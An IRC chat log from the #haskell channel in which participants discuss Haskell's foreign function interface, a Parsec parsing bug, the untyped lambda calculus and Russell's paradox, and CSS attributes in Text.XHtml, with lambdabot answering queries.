20:38:37 <earnest> so, alright... things are getting clearer; the compiler then already knows how to interface our code to the low level routines; if we want to add some new ones... such as X11, then the obvious solution is to hack the compiler; but there's a higher level approach (FFI). what is this higher level approach? how does this higher level approach work? is there a cool little way to tell the ghc that it will be handling calls to new functions (in
20:38:37 <earnest> raries)?
20:39:16 <earnest> and the syntax for this ``telling the compiler'' is defined in the FFI?
20:39:29 <Philippa> essentially, yes
20:39:47 <Philippa> once you know the calling conventions it's not too difficult to generate calls to arbitrary C code
20:39:48 <earnest> i see
20:39:55 <earnest> right; i get the idea
20:40:13 <ddarius> @google "Application Binary Interface"
20:40:15 <lambdabot> http://en.wikipedia.org/wiki/Application_binary_interface
20:40:15 <lambdabot> Title: Application binary interface - Wikipedia, the free encyclopedia
20:40:48 <thoughtpolice> earnest: here's a quick taste of the ffi if you want it http://therning.org/magnus/archives/238
20:40:51 <earnest> yeah, i see; it's this ABI thing that's not used to
20:41:01 <earnest> but ABI is like an API in .o-level, no?
20:41:46 <thoughtpolice> essentially.
20:41:58 <earnest> wow... that case in therning.org makes it all clear
20:42:39 <earnest> this is very powerful :)
20:45:04 <reffje> l'enfer c'est les autres
20:45:35 <ddarius> earnest: You do realize the code on therning.org says nothing about how FFI works and only how to use it...
20:45:46 <earnest> i do
20:46:36 <earnest> but it shows how it works; it tells the compiler that foo is another lowlevel function; so it treat that as it probably treats putStr (actually foo is probably lower than putStr to the compiler)
20:47:16 <earnest> does my lack of vocabulary express my thoughts?
20:48:03 <ddarius> The thing is, this is not what you were asking for earlier and you seemed uninterested in this level before (this level is the level covered by the FFI specification for example).
20:50:31 <earnest> yeah, i didn't express myself very well; i would love, of course, to understand it much deeper, but for now i was just looking for a reason not to have to call it magic; and now i have a better clue; but i'm too sure what the FFI specification really does? is that something for haskell-compilers implementators (and perhaps haskell-library-implementators to be aware of)?
20:50:48 <earnest> i'm [not] too sure (...)
20:51:00 <ddarius> earnest: It's part of the definition of Haskell itself.
20:51:12 <ddarius> Specifically, Haskell 98.
20:51:14 <earnest> okay
20:51:24 <sjanssen> as an addendum
20:51:31 <sjanssen> not part of Haskell '98 itself
20:51:39 <ddarius> True.
20:51:56 <earnest> that is, it's where they define that if you want to call some c int foo(int), then you will have to, for example, write ``foreign import ccall safe "foo.h foo" foo :: CInt -> IO CInt'' in your code
20:51:56 <sjanssen> earnest: the FFI is for compiler writers to implement and library writers to use
20:52:04 <earnest> sjanssen: got it
20:52:10 <sioraiocht> sjanssen: is that report something I should read if I'm interested in embedding calls to C functions in my haskell code?
20:52:12 <dons> ?users
20:52:13 <lambdabot> Maximum users seen in #haskell: 402, currently: 363 (90.3%), active: 12 (3.3%)
20:52:24 <ddarius> sioraiocht: Yes.
20:52:29 <sjanssen> sioraiocht: most certainly
20:52:32 <sioraiocht> thanks!
20:53:07 <sioraiocht> @hoogle CInt -> Int
20:53:08 <lambdabot> No matches, try a more general search
20:53:19 <sioraiocht> is there no way to convert a CInt to and Int?
20:53:23 <sioraiocht> *an
20:53:33 <ddarius> As always, fromIntegral
20:53:45 <sioraiocht> doh
20:53:49 <earnest> :t fromIntegral
20:53:51 <lambdabot> forall a b. (Num b, Integral a) => a -> b
20:53:53 <sioraiocht> <------ not thinking.
20:54:31 * ddarius goes off to hack an autoanswer plugin for lambdabot, when it sees the word "convert" it responds "fromIntegral" and when it sees the words "multiparameter type classes" it responds "functional dependencies."
20:54:42 <dons> heh
20:55:23 <dons> it should also answer "try type families" when it sees "problem with functional dependencies"
20:55:37 <ddarius> Maybe once 6.8 is released.
20:57:55 <dons> i like b7j0c's work, http://programming.reddit.com/info/2n24f/comments
20:57:57 <lambdabot> Title: Generating aggregated news feeds in Haskell (reddit.com)
20:59:31 <hpaste>  Tac-Tics pasted "Weird Parse Error" at http://hpaste.org/2618
20:59:48 <Tac-Tics2> Can someone help me figure out why my LC parser accepts "x)" as a valid string?
21:01:58 <Tac-Tics2> Oh the parsing!
21:02:11 <Tac-Tics2> No one wants to help me fight with Parsec?
21:02:18 <TSC> I'll have a look...
21:02:25 <Tac-Tics2> huzzah
21:02:59 <ddarius> You only parse vars of the form a', b''', c'' ?
21:03:20 <ddarius> And why do you use oneOf everywhere?
21:03:21 <hpaste>  dons pasted "amazing" at http://hpaste.org/2619
21:03:21 <Tac-Tics2> yeah
21:03:38 <Tac-Tics2> because I only skimmed the Parsec tutorial =-P
21:03:57 <sioraiocht> at least he's honest
21:03:59 <Tac-Tics2> symbol isn't it?
21:04:04 <Tac-Tics2> for a single oneOf?
21:04:27 <Tac-Tics2> also, technically, I wanted to allow for L -or- lambda in Unicode (if Haskell strings even support that kind of nonsense?)
21:04:27 <byorgey> char
21:04:31 <Tac-Tics2> ah
21:05:29 <ddarius> Tac-Tics2: As far as I can tell, it shouldn't parse "x)".  What does the parser return in that case?
21:05:41 <Tac-Tics2> Var "x"
21:06:17 <ddarius> Ah.  You want a eof or whatever it's called.
21:06:18 <Tac-Tics2> but "(", "()", and ")" return errors
21:06:55 <bos> my sojourn in the world of javascript isn't nearly as painful as i feared.
21:07:09 <ddarius> It's only parsing part of the string.  I was unsure whether parse required the whole string to be parsed.
21:07:20 <bos> jquery brings an almost haskell-like level of cleanliness to manipulating the DOM in javascript.
21:07:36 <ddarius> bos: Do you use higher-order functions in it to any significant degree?
21:07:48 <Tac-Tics2> ah, that could very well be it ddarius
21:07:57 <ddarius> Nar
21:08:07 <bos> ddarius: some, yes. there's quite a bit of CPS used.
21:08:23 <ddarius> Tac-Tics2: Change the parse parseExpr to parse (parseExpr >> eof) or whatever eof is called.
21:08:56 * ddarius thinks about whether a straight-forward use of CPS would cause problems.
21:09:41 <ddarius> (of course, the fact thath typical javascript implementations don't optimize tail calls should be an issue... (?))
21:10:23 <bos> in practice, the continuations aren't chained deeply.
21:10:34 <Tac-Tics2> sweet, that got it
21:10:37 <Tac-Tics2> ddarius++
21:10:52 <ddarius> bos: Wouldn't you run into trouble if you made a loop?
21:11:03 <Tac-Tics2> what kind of loop?
21:11:13 <bos> ddarius: presumably.
21:11:15 <Tac-Tics2> like (Lx.xx)(Lx.xx) or something?
21:11:29 <ddarius> Tac-Tics2: My sentence was directed at bos.
21:11:30 <Tac-Tics2> ah, nvm
21:11:36 <Tac-Tics2> yeah
21:12:01 <ddarius> bos: Javascript's lack of block scoping can bite hard in crazy ways.
21:12:01 <Tac-Tics2> I was about to say, LC was invented to show you can't prevent my program from getting stuck in a loop ^^;;
21:12:01 <bos> it's not a functional toolkit, it's just got that same kind of appealing terseness.
21:12:24 <bos> ddarius: fortunately, i haven't had to declare or use a single variable yet.
21:12:47 <ddarius> Tac-Tics2: Actually, that's not the case at all.  It was quite the disaster when that happened and type lambda calculi were invented just to get rid of that.
21:12:56 <bos> it's bouncy dons night!
21:13:13 <dons> i need to get a server up and running
21:13:20 <bos> looking for a gaff yet?
21:13:37 <dons> gaff? i am not familiar with this phrase. :)
21:13:38 <Tac-Tics2> *sigh*
21:13:40 <ddarius> bos: So what you're saying is that jquery is nice and javascript is nice insofar as it allowed jquery to be implemented.
21:13:42 <bos> home
21:13:52 <dons> starting to, yeah.
21:14:00 <Tac-Tics2> typed calculus doesn't nullify the halting problem
21:14:01 <dons> just getting a sense of the area
21:14:02 <bos> ddarius: jquery is nice. i have no opinion about javascript, having never needed to write any.
21:14:27 <bos> i intend to continue having no opinion about javascript for as long as possible
21:14:35 <dons> mostly though i'm just exhausted. who'd have thought a real job would require real work!
21:14:45 <bos> l'choc!
21:15:05 <ddarius> Tac-Tics2: The lambda calculus wasn't made for the halting problem.  Originally it was supposed to be a language to discuss all of mathematics in.  Typed lambda calculi have actually done a good job of that.
21:15:26 * ddarius has no idea where bos got "gaff" from.
21:15:38 <dons> oh, i have an enemy do I. somone posting dodgy things to hpaste under my name :/
21:16:19 <bos> ddarius: it's anglo-irish slang.
21:16:30 <ddarius> dons: I don't really get the point, the only people who will notice is us.
21:16:45 <ddarius> But then I never get the point of such things.
21:16:54 <dons> ddarius: bit weird. oh well, `hpaste.delete' is easy enough :)
21:16:58 <Tac-Tics2> According to the Source of All Human Knowledge (http://en.wikipedia.org/wiki/Lambda_calculus), it was indeed used to demonstrate the halting problem was undecidable.... whether or not it was created for that purpose ::shrug::
21:17:15 <sorear> what was it?
21:17:25 <bos> often when i am sitting with another developer at their desk, fixing a bug i introduced, i'll commit the fix from their account using the comment "bos is a moron"
21:17:38 <dons> sorear: ascii art
21:17:42 <aFlag> why wouldn't the turing machine work for demonstrating the halt problem is undecidable?
21:17:58 <Tac-Tics2> They both do, because they're equivalent
21:17:59 <ddarius> Tac-Tics2: Yes, it being able to do that was a -problem- as I said at the get-go.
21:18:02 <dons> sorear: it would be interesting to get the IP address..
21:18:21 <aFlag> Tac-Tics2, why was lambda calculus used for it, though?
21:20:06 <dons> you like detective work, sorear :)
21:20:39 <aFlag> wikipedia said it was used to prove that it wsa undecidible to find out if two lambda calculus are equivalent. But I couldn't find where it says it was used for proving the halting problem is undecidible
21:21:04 <ddarius> aFlag: It wasn't used originally.  Turing machines were.
21:21:09 <Tac-Tics2> ddarius: but any language or Lambda Calculus which is so strongly typed that you can't prove the halting problem with isn't Turing Complete
21:21:40 <Tac-Tics2> right?
21:21:48 <ddarius> Tac-Tics2: That's a good thing if you want a consistent logic.
21:21:49 <sorear> who cares about turing completeness?
21:21:49 <Olathe> How many candy bars has Turing completeness ever bought anyone ?
21:21:53 <aFlag> ddarius, oh, I thought Tac-Tics2 was saying it was used originally
21:22:18 <Tac-Tics2> There's nothing wrong with assuming consistency of untyped lambda calculus
21:22:22 <jbalint> what is wsa
21:22:38 <Tac-Tics2> because if it is inconsistent, you have more to worry about than whether or not your language will work right ;-)
21:24:06 <aFlag> jbalint, the same as was
21:24:11 <jbalint> oh
21:24:19 * jbalint cant read :(
21:24:33 <ddarius> Tac-Tics2: The untyped lambda calculus corresponds to naive set theory and suffers from Russel's paradox.
21:24:57 <aFlag> I should say "is" instead of "was", actually
21:25:18 <aFlag> ddarius, hm, how come?
21:25:25 <Tac-Tics2> typed calculus can't implement the Ackermann function
21:25:29 <ddarius> aFlag: How come what?
21:25:41 <aFlag> how come it suffers from russel's paradox?
21:25:47 <aFlag> I can't relate the two things
21:26:49 <ddarius> aFlag: comprehension notation more or less corresponds to abstraction and checking for membership to application working it out, Y not is what Russel's paradox corresponds to in the untyped lambda calculus.
21:27:04 <Tac-Tics2> > fix not
21:27:06 <lambdabot>  Exception: <<loop>>
21:27:08 <Tac-Tics2> see?
21:27:10 <dons> night all
21:27:13 <ddarius> I.e. we identify a set with it's characteristic function.
21:28:12 <aFlag> hm
21:29:12 <ddarius> Tac-Tics2: Whether Ackermann's function can be implemented depends on the types and the primitives.
21:33:49 <ddarius> aFlag: The set of sets that don't contain themselves, N = {x | not (x in x) } <~> N = \x.not (x x).  Is N in N? <~> N N -> (\x.not (x x)) (\x.not (x x)) = Y not
21:38:26 <Tac-Tics2> That is a very clear way of describing the isomorphism between it
21:39:36 <aFlag> that will be an infinite loop, what's paradoxal about the lambda calculus program?
21:39:50 <sorear> argh...
21:40:04 <ddarius> aFlag: What's paradoxical about Russel's paradox?
21:40:04 <sorear> you just said it
21:40:41 <Tac-Tics2> I always like to explain the halting problem to people in C++ese
21:40:45 <hpaste>  Tac-Tics pasted "The halting problem in C++ese" at http://hpaste.org/2620
21:40:51 <ddarius> And I keep dropping Russell's other 'l'.
21:41:32 <aFlag> well, you can't construct the set he proposed
21:41:50 <Tac-Tics2> aFlag: from a CS major's point of view, there is nothing paradoxal about Russel's paradox... it's a machine that just doesn't ever stop until you CTRL+C it
21:42:09 <Tac-Tics2> but to math-types who want ALL functions to give them an answer, it's a nightmare
21:42:17 <aFlag> hm
21:42:31 <FMota> math is unreasonable.
21:42:33 <Tac-Tics2> but the truth of the matter is, you can't prove whether any arbitrary function halts or not
21:42:37 <FMota> not adjusted to the real world.
21:43:01 <Tac-Tics2> (though you can prove a very large class of functions do halt, including everything a Haskeller would ever allow you to use ^^)
21:43:04 <aFlag> Tac-Tics2, the russell's paradox relates to that somehow?
21:43:48 <Olathe> If naive set theory is complete, it can answer Russell's paradox. It can't, so it's not complete.
21:43:56 <Tac-Tics2> aFlag: try to find a definition for halt where "halt(func)" returns true if "func()" halts and false if "func()" gets stuck in a loop
21:44:16 <Olathe> The paradox is that naive set theory was thought to be complete.
21:44:27 <aFlag> well, I know that's an undecidible problem, so I can't write such a function
21:44:39 <Tac-Tics2> Olathe, the paradox was that naive set theory was thought to be consistent
21:44:42 <aFlag> I think I don't really know what paradox means
21:45:30 <Olathe> A paradox is an unexpected contradiction.
21:45:40 <Olathe> Or an unexpected result.
21:45:44 <Tac-Tics2> but Godel proved in 1931 that Completeness and Consistency were mutually exclusive with formal systems
21:45:52 <ddarius> Olathe: That's rather more general than a "paradox"
21:46:06 <ddarius> Tac-Tics2: For powerful enough systems.
21:46:11 <Tac-Tics2> yes, sorry
21:46:17 <sorear> Tac-Tics2: False, he only proved it for the case of systems containing arithmetic
21:46:23 <Tac-Tics2> for formal systems which allow for all of Number Theory
21:46:32 <Olathe> ddarius: How paradoxical.
21:46:35 <Tac-Tics2> yes, I know =-P
21:46:39 <sorear> First order prepositonal logic is complete and consistent.
21:47:27 <Tac-Tics2> but of course, the only reason we know first order prepositional logic is complete is because we (a formal system of sorts) decided it ;-)
21:48:07 <xpika> @src any
21:48:07 <lambdabot> any p =  or . map p
21:48:46 <xpika> @src or
21:48:47 <lambdabot> or    =  foldr (||) False
21:48:47 <Tac-Tics2> Well, I got my parser working and I fought yet another battle for untyped lambda calculus. I'd say my work here is done ;-)
21:48:51 <Tac-Tics2> I'm gonna go play some DDR~
21:49:17 <Tac-Tics2> ddarius, thank you again for your parsec help and debate practice^^
21:54:58 <thetallguy> when I use Text.XHtml.Transitional.bgcolor, I get a warning that it is deprecated, but no mention of what the replacement mechanism.  Does anyone happen to know?
21:55:24 <ddarius> CSS?
21:55:52 <thetallguy> There is no CSS support in there that I'm aware of.
21:56:07 <aFlag> Tac-Tics2, are you a computer science major?
21:56:29 <jcreigh> thetallguy: "in there"?
21:56:46 <thetallguy> jcreigh: in Text.XHtml
21:57:00 <jcreigh> thetallguy: you can't set the "class" or "style" attributes?
21:57:28 <thetallguy> ddarius:  I think that the HTML standard deprecates things as you say, but this is a Haskell warning
21:57:47 <thetallguy> jcreigh: no, theere is no support for CSS in XHtml
21:58:13 <thetallguy> or rather, the Haskell module Text.XHtml.Transitional
21:58:51 <thetallguy> I set out to write such a thing once.  Perhaps I should go back to that.
22:00:04 <jcreigh> @hoogle theclass
22:00:05 <lambdabot> Text.Html.theclass :: String -> HtmlAttr
22:00:07 <jcreigh> @hoogle thestyle
22:00:08 <lambdabot> Text.Html.thestyle :: String -> HtmlAttr
22:00:34 <jcreigh> I've never used the API, but those seem suggestively named to me, and appear to be in Text.XHtml.Transitional as well: http://www.haskell.org/ghc/docs/latest/html/libraries/xhtml/Text-XHtml-Transitional.html#8
22:00:37 <lambdabot> http://tinyurl.com/yupucc
22:00:58 <thetallguy> jcreigh:  I stand corrected
22:01:42 <thetallguy> I wonder if BB added those?  I don't remember seeing them before
22:01:45 <sorear> HPaste uses CSS and Xhtml
22:01:53 <sorear> EM might have
22:02:25 <thetallguy> Right, well, thanks for the extra eyes, I'll give it a shot.
22:06:08 <FMota> hpaste is awesome.
22:06:29 <FMota> gnight folks
22:09:28 <thetallguy> jcreigh:  Spiffy.  That was the right answer, as witnessed by the code in http://darcs.haskell.org/packages/xhtml/Text/XHtml/Debug.hs
22:10:42 <ddarius> CSS generally is the solution in this modern age (fortunately!)
22:14:27 <thetallguy> ddarius: yes, thought it would be nice if it were a bit more sensible.
22:14:50 <ddarius> I'd prefer not generating inline CSS at all...
22:15:00 <thetallguy> ddarius:  try generating a Haskell type for it and you'll see what I mean
22:15:17 <ddarius> thetallguy: Haskell type for what?
22:15:40 <thetallguy> ddarius: for style sheets.
22:16:22 <thetallguy> ddarius: that is, create a set of types that represent all valid CSS style sheets but no invalid ones.
22:16:31 <ddarius> thetallguy: Why bother?  Just generate a reference to a style sheet elsewhere.  You usually don't need to programmatically generate style sheets.
22:16:56 <thetallguy> ddarius:  I absolutely do want to generate them.
22:16:58 <mr_tenor> hrm... for a conference paper that's being read by non-Haskllers, do you think explicit recursion would be easier to read than something like
22:16:59 <mr_tenor> f d xs = concat (map (g d) xs)
22:17:09 <mr_tenor> (with better variable names than that of course)
22:17:23 <thetallguy> ddarius:  And I want to know at compile time that I'm not generating bad ones.
22:17:23 <shapr> What sort of background do these non-Haskellers have?
22:17:32 <mr_tenor> sinal processing
22:17:37 <mr_tenor> *signal*
22:17:40 <shapr> If they're math geeks, it's likely not a problem.
22:17:54 <ddarius> mr_tenor: What?!  You think they'd prefer explicit recursion more than combinators?!
22:18:17 <ddarius> They shouldn't have any problem with either.
22:18:56 <mr_tenor> ddarius: heh. one of my points is that Haskell is higher level, but I want people to take one look and go "this implemntation is clearer than what i've been doing!" instead of "hrm... strange alien technology"
22:20:22 <dons> stepcut: btw, great work on this haskell in 5 minutes series.
22:20:22 <lambdabot> dons: You have 2 new messages. '/msg lambdabot @messages' to read them.
22:20:49 <shapr> whoa, pix of stepcut!
22:21:19 <dons> sorear: good work Detective Sorear. I guess we'll just leave it at that :)
22:21:22 <thetallguy> dons: the funny thing is, he hadn't done any publicity about it.
22:21:27 <dons> shapr: yeah! freaky stuff
22:21:38 <dons> thetallguy: yeah, that's the weird thing. did he mention it today?
22:21:45 <thetallguy> dons: what do you mean freaky?
22:21:58 <dons> photos of stepcut :) i always just assumed he was a bot
22:22:10 <shapr> I could never get him to upload pix.
22:22:11 <thetallguy> dons:  Yeah, I was chatting with him and he was surprised that it had been dugg.
22:22:19 <thetallguy> dons: I can assure you, not a bot.
22:22:28 <dons> did he not intend it to be released yet?
22:22:28 <shapr> Except that one animated pic of him making faces.
22:22:42 <thetallguy> Hmm...  I should have pics of him somewhere.
22:22:46 <mr_tenor> hrm... http://hpaste.org/2621
22:23:52 <thetallguy> Hmm...  This one's a bit squinty, but it's got that matrix look:  http://stockwits.com/Photos/Theresa%20Birthday/p_IMG_0466.JPG.html
22:23:54 <lambdabot> Title: , http://tinyurl.com/3ccwe5
22:24:34 <dons> :)
22:24:42 <mr_tenor> thetallguy: http://i144.photobucket.com/albums/r179/Fdaveokc/Toons/garfieldmatrix.jpg
22:24:43 <lambdabot> http://tinyurl.com/2djuth
22:24:46 <thetallguy> dons: I think he intented to announce it when he had more than one episode
22:25:13 <thetallguy> mr_tenor: chuckle
22:25:27 <dons> ah, ok. it just came up in my rss feed this morning. i assumed he was slipping it out on the sly
22:26:18 <thetallguy> dons: I had given a little tutorial to another friend and was talking about technology for that, and that reminded him that he wanted to start the series
22:26:30 <sorear> uhm, where is this?
22:26:33 <thetallguy> dons: but I don't think he knows how it ended up on reddit
22:26:42 * sorear never found a stepcut web presence worthy of the name
22:26:44 <thetallguy> sorear: learnhaskell.blogspot.com
22:27:03 <sorear> Planet haskell has failed me!
22:27:13 <dons> thetallguy: ah, google blog search found it, my rss feed to google put it in my inbox. :)
22:27:36 <thetallguy> dons: Dang search engines!
22:27:48 * dons enjoys his new thinkpad dual core 64 bit laptop.
22:28:09 <dons> sorear: though ghci seems to be failing. i'll need to look into that. (linker stuff)
22:28:29 <thetallguy> on a side note, iving an informal tutorial to a friend, he found it very helpful when I did:  import Prelude ()
22:28:47 <dons> oh? can you elaborate
22:29:02 <thetallguy> Helped him sort through what was built-in/magic versus keyword versus not.
22:29:28 <ddarius> "Oh my god!  There's nothing to this language!"
22:29:33 <dons> ah. good idea.
22:29:47 <thetallguy> Looking at the Maybe type, for example, he couuldn't tell immediately what was keyword, etc.
22:30:09 <thetallguy> So, I forced myself to bring in every type that we used.
22:30:11 <ddarius> And then you used a do-block...
22:30:21 <thetallguy> that is, write it explicitly
22:30:35 <thetallguy> ddarius:  I stuck to pure functions.
22:30:53 <ari> thetallguy: Now with -fno-implicit-prelude it would have gotten *really* interesting ;)
22:30:59 <thetallguy> actually, I was explaining data and type constructors and show him the type and kind signagures
22:31:02 <ddarius> And then you used otherwise in a guard.
22:31:13 <thetallguy> ari: yeah, I did not want to go that far.
22:31:17 <olsner> :t otherwise
22:31:19 <lambdabot> Bool
22:31:28 <olsner> > otherwise
22:31:30 <lambdabot>  True
22:31:35 <thetallguy> signagures.  Nice word.
22:31:36 <ddarius> @src otherwise
22:31:37 <lambdabot> otherwise = True
22:32:31 <dons> ok. night all, for real.
22:51:03 <stepcut> shapr: I forgot I have pix on myspace ;) http://viewmorepics.myspace.com/index.cfm?fuseaction=user.viewPicture&friendID=76456942&albumId=0
22:51:06 <lambdabot> Title: MySpace, http://tinyurl.com/2djxqz
23:18:09 <sjanssen> @keal
23:18:10 <lambdabot> can haskell compile flash animations and java apps?
23:19:30 <olsner> @protontorpedo
23:19:30 <lambdabot> scheme, lisp, php, python, perl, tcl, al banned
23:39:57 <earnest> all calm in the west
23:54:20 <Tac-Tics2> Go types. Boo strictness.
23:59:35 <psykotic> we need to start using "schoolmarmish" instead of "strict" in our propaganda materials.
